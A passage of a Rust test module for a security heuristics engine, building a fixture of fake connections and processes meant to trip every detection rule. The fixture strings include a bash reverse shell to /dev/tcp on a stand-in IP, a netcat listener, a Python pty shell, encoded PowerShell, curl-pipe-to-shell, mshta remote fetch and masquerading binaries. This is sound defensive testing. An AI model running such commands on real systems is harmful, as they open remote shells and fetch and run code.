            lineage: lineage.iter().map(|s| s.to_string()).collect(),
            cpu_usage: 0.0,
            memory_bytes: 0,
            run_time_secs: 0,
            exe_exists_on_disk: !exe.is_empty(),
            is_deleted_binary: exe.ends_with(" (deleted)"),
            open_sockets_count: 0,
            max_severity: Severity::Safe,
        }
    }

    /// One input that trips every rule. Guards refactors of this file.
    fn golden_input() -> (Vec<ConnectionEntry>, HashMap<u32, ProcessRecord>) {
        let wildcard = IpAddr::V4(Ipv4Addr::UNSPECIFIED);
        let mut conns = Vec::new();
        let mut add = |id: usize, name: &str, exe: &str, cmd: &str, state: &str, lp: u16, rp: Option<u16>| {
            let mut c = socket(state, lp, rp);
            c.id = id;
            c.pid = Some(1000 + id as u32);
            c.process_name = name.to_string();
            c.exe_path = exe.to_string();
            c.cmdline = cmd.to_string();
            if state == "LISTEN" {
                c.local_ip = wildcard;
                c.exposure = ExposureScope::WildcardAllInterfaces;
            }
            conns.push(c);
        };
        add(1, "bash", "/usr/bin/bash", "bash -i", "ESTABLISHED", 51000, Some(4444));
        add(2, "nc", "/usr/bin/nc", "nc -lvp 31337", "LISTEN", 31337, None);
        add(3, "python3", "/usr/bin/python3", "python3 -c import socket,pty;pty.spawn('/bin/sh')", "ESTABLISHED", 51001, Some(443));
        add(4, "redis-server", "/tmp/redis-server", "redis-server", "LISTEN", 6379, None);
        add(5, "unknown", "", "", "ESTABLISHED", 51002, Some(443));
        add(6, "app", "/opt/app", "app", "LISTEN", 8081, None);
        add(7, "sshd", "/usr/sbin/sshd", "sshd", "LISTEN", 22, None);
        add(8, "sshd", "/usr/sbin/sshd", "sshd", "ESTABLISHED", 22, Some(45560));
        add(9, "miner", "/opt/miner", "miner", "ESTABLISHED", 51003, Some(3333));

        let mut procs = HashMap::new();
        for p in [
            proc_rec(2001, "bash", "/usr/bin/bash", "bash -c sh -i >& /dev/tcp/198.51.100.7/4444 0>&1", &["nginx(400)", "bash(2001)"]),
            proc_rec(2002, "x", "/dev/shm/x (deleted)", "x", &["x(2002)"]),
            proc_rec(2003, "svchost.exe", r"C:\Users\u\AppData\Local\Temp\svchost.exe", "svchost.exe", &["svchost.exe(2003)"]),
            proc_rec(2004, "x", "/tmp/x", "[kworker/0:0]", &["x(2004)"]),
            proc_rec(2005, "powershell.exe", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "powershell.exe -nop -enc ZQBjAGgAbwA=", &[]),
            proc_rec(2006, "sh", "/bin/sh", "sh -c curl http://x | sh", &[]),
            proc_rec(2007, "mshta.exe", r"C:\Windows\System32\mshta.exe", "mshta.exe http://x/a.hta", &[]),
            proc_rec(2008, "scvhost.exe", r"C:\Windows\scvhost.exe", "scvhost.exe", &[]),
        ] {
            procs.insert(p.pid, p);
        }
        (conns, procs)
    }

    fn golden_triples() -> Vec<String> {
        let (mut conns, mut procs) = golden_input();
        let findings = evaluate_security_heuristics(&mut conns, &mut procs);
        let mut out: Vec<String> = findings
            .iter()
            .map(|f| format!("{} {:?} {:?}", f.rule_id, f.severity, f.pid))
            .collect();
        out.extend(conns.iter().map(|c| format!("conn{} {:?}", c.id, c.severity)));
        out.sort();
        out
    }

    #[test]
    fn golden_input_trips_every_rule() {
        let expected = include_str!("golden_heuristics.txt");
        assert_eq!(golden_triples().join("\n"), expected.trim_end().replace("\r\n", "\n"));
    }

    /// Exact before/after dump for refactors:
    /// cargo test print_golden_full -- --ignored --nocapture
    #[test]
    #[ignore]
    fn print_golden_full() {
        println!("TRIPLES\n{}\nFULL", golden_triples().join("\n"));
        let (mut conns, mut procs) = golden_input();
        let findings = evaluate_security_heuristics(&mut conns, &mut procs);
        let mut lines: Vec<String> = findings.iter().map(|f| format!("{f:?}")).collect();
        lines.extend(conns.iter().map(|c| format!("{:?} {:?} {:?}", c.id, c.severity, c.risk_reasons)));
        let mut p: Vec<_> = procs.values().map(|p| format!("{} {:?}", p.pid, p.max_severity)).collect();
        lines.append(&mut p);
        lines.sort();
        println!("{}", lines.join("\n"));
    }
}
